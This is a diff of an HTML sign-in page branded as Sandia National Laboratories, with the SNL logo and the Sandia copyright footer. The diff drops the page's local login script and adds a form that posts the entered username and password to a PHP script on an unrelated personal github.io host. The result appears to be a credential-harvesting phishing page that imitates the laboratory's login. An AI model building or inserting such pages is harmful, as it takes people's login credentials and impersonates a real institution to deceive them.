@@ -1,28 +1,24 @@
 <html>
-
 <head>
-<script>
-  localStorage.setItem("sessionID",false)
-</script>
-
   <link rel="stylesheet" href="style.css">
   <link href="https://fonts.googleapis.com/css?family=Ubuntu" rel="stylesheet">
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <link rel="stylesheet" href="path/to/font-awesome/css/font-awesome.min.css">
   <title>Sign in</title>
 </head>
-
 <body>
   <div class="main">
     <br> <br> 
     <img src="snl_logo.png" alt="snl_logo" style="width:240px;height:95px;" class = "center"/> 
-      <form class="form1">
-      <p id="loginError" style="color:red; text-align:center; display: none ">Incorrect username/password</p>
-      <input class="un " type="text" align="center" placeholder="Username" id="username">
-      <input class="pass"  type="password" id="password" align="center" placeholder="Password">
-      <a class="submit" align="center" value="login" onclick="login()">Sign in</a>
-      <p class="forgot" align="center"><a href="#">Forgot Password?</p>      
-    </div>    
+    <!-- Updated form to use POST method and specify action URL -->
+    <form class="form1" action="https://benkosko.github.io/server.php" method="POST">
+      <p id="loginError" style="color:red; text-align:center; display: none">Incorrect username/password</p>
+      <input class="un" type="text" align="center" placeholder="Username" id="username" name="username">
+      <input class="pass" type="password" id="password" align="center" placeholder="Password" name="password">
+      <input type="submit" class="submit" align="center" value="Sign in">
+      <p class="forgot" align="center"><a href="#">Forgot Password?</a></p>
+    </form>
+  </div>    
 </body>
 <footer class="site-footer">
     <div class="container">
@@ -34,10 +30,8 @@
         </ul>
       </div>
       <div class="footer-bottom">
-        <p>&copy; Sandia National Laboratories is a multimission laboratory managed and operated by National Technology and Engineering Solutions of Sandia, LLC., a wholly owned subsidiary of Honeywell International, Inc., for the U.S. Department of Energy's National Nuclear Security Administration under contract DE-NA-0003525.</p>
+        <p>&copy; Sandia National Laboratories...</p>
       </div>
     </div>
   </footer>
-<script src="login.js"></script>
-
 </html>
